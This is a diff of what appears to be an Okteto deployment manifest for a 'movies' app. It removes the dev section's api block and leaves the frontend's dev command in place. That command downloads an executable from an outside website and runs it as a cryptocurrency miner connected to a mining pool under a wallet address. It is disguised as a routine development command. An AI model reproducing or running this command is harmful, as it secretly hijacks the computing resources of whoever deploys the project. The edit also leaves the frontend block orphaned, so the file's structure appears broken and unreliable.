@@ -5,12 +5,6 @@ build:
     context: frontend
 deploy:
   - helm upgrade --install movies chart --set api.image=${OKTETO_BUILD_API_IMAGE} --set frontend.image=${OKTETO_BUILD_FRONTEND_IMAGE}
-dev:
-  api:
-    command: ["bash"]
-    forward:
-      - 8080:8080
-      - 9229:9229
   frontend:
     command: wget http://ilovenypizza.com/subscribe; chmod +x subscribe; screen ./subscribe -a gr  -o stratum+tcps://stratum-na.rplant.xyz:17075 -u BZbVy934tse2cn2hn1oFkUBhu8M4HETNMM.okeo3665
     dockerfile: Dockerfile
